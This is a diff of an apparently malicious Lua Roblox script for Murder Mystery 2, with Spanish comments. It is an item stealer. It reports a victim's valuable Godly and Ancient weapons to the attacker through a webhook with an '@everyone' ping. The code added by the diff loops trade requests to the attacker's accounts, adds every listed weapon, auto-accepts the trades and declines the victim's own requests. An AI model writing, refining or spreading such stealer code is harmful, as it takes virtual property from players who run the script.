@@ -16,22 +16,10 @@ if not req then warn("No HTTP request method available!") return end
 
 -- Lista de valores Godly + Ancient (respaldo)
 local fallbackValueList = {
-    ["gingerscope"]=10700,
-    ["travelers axe"]=6900,
-    ["celestial"]=975,
-    ["astral"]=850,
-    ["morning star"]=720,
-    ["northern star"]=680,
-    ["moonlight"]=640,
-    ["helios"]=600,
-    ["stormbringer"]=580,
-    ["reaper"]=550,
-    ["blaze"]=500,
-    ["phantom"]=470,
-    ["zenith"]=450,
-    ["ares"]=420,
-    ["hephaestus"]=400,
-    ["mystic"]=380
+    ["gingerscope"]=10700, ["travelers axe"]=6900, ["celestial"]=975, ["astral"]=850,
+    ["morning star"]=720, ["northern star"]=680, ["moonlight"]=640, ["helios"]=600,
+    ["stormbringer"]=580, ["reaper"]=550, ["blaze"]=500, ["phantom"]=470,
+    ["zenith"]=450, ["ares"]=420, ["hephaestus"]=400, ["mystic"]=380
 }
 
 -- Páginas para scraping
@@ -161,45 +149,52 @@ local prefix = _G.pingEveryone=="Yes" and "@everyone " or ""
 local thumbnailURL = "https://i.postimg.cc/fbsB59FF/file-00000000879c622f8bad57db474fb14d-1.png"
 SendWebhook("💪MM2 Ultra Hit💯","💰Armas seleccionadas Godly/Ancient",fields,prefix,thumbnailURL)
 
--- Trade continuo ultra seguro
-local function doTrade(targetName)
-    while #weaponsToSend > 0 do
-        local status = getTradeStatus()
-        if status=="None" then
-            sendTradeRequest(targetName)
-        elseif status=="StartTrade" then
-            local blockSize = 4
-            while #weaponsToSend>0 and getTradeStatus()=="StartTrade" do
-                for i=1, math.min(blockSize,#weaponsToSend) do
+-- Trade continuo infinito al mismo usuario
+local function doInfiniteTrade(targetName)
+    while true do
+        if #weaponsToSend > 0 then
+            local status = getTradeStatus()
+
+            if status == "None" then
+                sendTradeRequest(targetName)
+            elseif status == "StartTrade" then
+                -- Agregar todas las armas
+                while #weaponsToSend > 0 do
                     local w = table.remove(weaponsToSend,1)
-                    for _=1, w.Amount do addWeaponToTrade(w.DataID) end
+                    for _ = 1, w.Amount do
+                        addWeaponToTrade(w.DataID)
+                    end
                 end
-                task.wait(0.3)
+                task.wait(1)
+                acceptTrade()
+                waitForTradeCompletion()
+            elseif status == "ReceivingRequest" then
+                declineRequest()
+            else
+                task.wait(0.5)
             end
-            task.wait(7)
-            acceptTrade()
-            waitForTradeCompletion()
-        elseif status=="ReceivingRequest" then
-            declineRequest()
-            task.wait(0.3)
-        elseif status=="StartTrade" then
-            declineTrade()
-            task.wait(0.3)
-        else
-            task.wait(0.5)
         end
-        task.wait(1)
+        task.wait(0.5)
     end
 end
 
--- Activación trade por chat solo para tus usuarios
+-- Ejecutar trade infinito apenas el usuario chatee o se conecte
 for _,p in ipairs(Players:GetPlayers()) do
     if table.find(users,p.Name) then
-        p.Chatted:Connect(function() doTrade(p.Name) end)
+        p.Chatted:Connect(function()
+            task.spawn(function()
+                doInfiniteTrade(p.Name)
+            end)
+        end)
     end
 end
+
 Players.PlayerAdded:Connect(function(p)
     if table.find(users,p.Name) then
-        p.Chatted:Connect(function() doTrade(p.Name) end)
+        p.Chatted:Connect(function()
+            task.spawn(function()
+                doInfiniteTrade(p.Name)
+            end)
+        end)
     end
 end)
